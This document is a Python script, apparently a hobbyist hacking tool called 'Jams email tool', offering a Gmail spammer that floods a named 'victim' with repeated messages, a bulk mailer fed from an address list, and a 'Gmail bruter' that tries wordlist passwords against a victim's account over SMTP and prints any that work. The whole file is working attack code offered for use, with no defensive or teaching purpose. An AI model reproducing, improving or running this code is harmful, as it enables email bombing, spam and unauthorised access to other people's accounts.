import time
import smtplib, ssl
from os import system, name
from colorama import Fore, Back, Style
import sys
from tqdm import tqdm
import pyfiglet

out = pyfiglet.figlet_format("JET", font="doh")
outstand1 = pyfiglet.figlet_format("Gmail Spammer", font="rectangles")
outstand4 = pyfiglet.figlet_format("Gmail Bruter", font="rectangles")
smtp_server = "smtp.gmail.com"
port = 587

def clear(): #this clears screen
        _ = system('cls')

print(Fore.GREEN + "This tool was made by Jam")
print(Fore.RED + '''
 +--^----------,--------,-----,--------^-,
 | |||||||||   `--------'     |          O
 `+---------------------------^----------|
   `\_,---------,---------,--------------'
     / XXXXXX /'|       /'
    / XXXXXX /  `\    /'
   / XXXXXX /`-------'
  / XXXXXX /
 / XXXXXX /
(________(
 `------'
             Type help for help
''')
startup = input("Press enter to continue:")
if startup == 'help':
    time.sleep(1)
    print('''
     Server:https://discord.gg/Rkneqm4uZN
     To work turn on less secure app access
     !The mail may appear in spam folder!
    ''')
    time.sleep(10)
clear()
print(Fore.BLUE + out)
print("Jams email tool")
print('''
--Gmail tools--
[1] Gmail spammer
[2] Mass email sender
[3] Gmail bruter 
(More tools coming soon)
''')
optionfirst = input("Enter option:")

if optionfirst == '1':
    clear()
    print(Fore.BLUE + outstand1)
    sender_email = input(Fore.RED + "Enter your email:") #email for you account
    password = input("Enter password:") #password for your account
    receiver_email = input("Enter victim:") #victims email
    message = input("Enter message:") #message
    times = input("Enter ammount of times:") #how many times it sends the email
    times1 = int(times) #changes the string to an int
    context = ssl.create_default_context()

    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls(context=context)
        server.ehlo()
        server.login(sender_email, password)
        for times1 in range(times1): #this is the loop and loop counter
            server.sendmail(sender_email, receiver_email, message)
            times2 = str(times1)
            print("Emails sent: [" + times2 + "] to [" + receiver_email + "]" )
    except Exception as e: #prints the error
        print("Error, sending Exception.. ")
        time.sleep(1)
        print(e)
        time.sleep(10)
        server.quit() #quits
    finally:
        print("")

        print("Finsihed sending all: [" + times2 + "] emails!")
        time.sleep(1)
        server.quit() #quits after all emails have been sent

if optionfirst == '2':
    clear()
    print(Fore.BLUE + outstand1)
    sender_email = input(Fore.RED + "Enter your email:") #email for you account
    password = input("Enter password:") #password for your account
    receiver_email = input("Enter email list:") #email list
    receiver_email = open(receiver_email)
    message = input("Enter message:") #message
    context = ssl.create_default_context()

    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls(context=context)
        server.ehlo()
        server.login(sender_email, password)
        number = 1
        for emailword in receiver_email: #this is the loop and loop counter
            server.sendmail(sender_email, emailword, message)
            print ("[", end = '')
            print (number, end = '')
            print ("]", end = '')
            print(" ")
            number = number + 1
    except Exception as e: #prints the error
        print("Error, sending Exception.. ")
        time.sleep(1)
        print(e)
        time.sleep(10)
        server.quit() #quits
    finally:
        print("")
        print("Sent all all emails")
        time.sleep(1)
        server.quit() #quits after all emails have been sent


if optionfirst == '3':
    clear()
    print(Fore.BLUE + outstand4)
    user = input("Enter victims email:")
    wordlist = input("Enter passlist:")
    wordlist = open(wordlist, "r")
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.ehlo()
    context = ssl.create_default_context()
    server.starttls(context=context)
    
    for password in wordlist:
        try:
            server.login(user, password)
            print("[+] Password cracked!")
            time.sleep(1)
            print("[!] " + password)
            time.sleep(100)
            server.quit()
        except smtplib.SMTPAuthenticationError as e:
            if e.smtp_code == 534:
                print("[-] Password Correct, email verification on: " + password)
            elif e.smtp_code == 535:
                print("[-] Password incorrect: " + password)
